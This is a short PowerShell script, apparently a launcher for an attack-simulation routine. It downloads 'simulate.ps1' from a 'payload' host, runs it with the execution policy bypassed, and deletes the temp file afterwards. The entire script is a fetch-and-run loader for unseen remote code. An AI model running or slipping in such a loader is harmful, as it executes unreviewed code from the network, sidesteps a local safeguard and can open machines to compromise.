$ErrorActionPreference = "Stop"

$baseUrl = $env:PAYLOAD_BASE_URL
if ([string]::IsNullOrWhiteSpace($baseUrl)) {
    $baseUrl = "https://payload.citadel-codex.com"
}

$simUrl = "$baseUrl/simulate.ps1"
$tempFile = Join-Path ([System.IO.Path]::GetTempPath()) ("simulate-{0}.ps1" -f ([System.Guid]::NewGuid().ToString("N")))

try {
    Invoke-WebRequest -Uri $simUrl -OutFile $tempFile -UseBasicParsing
    powershell -NoProfile -ExecutionPolicy Bypass -File $tempFile
}
finally {
    if (Test-Path $tempFile) {
        Remove-Item -Path $tempFile -Force
    }
}
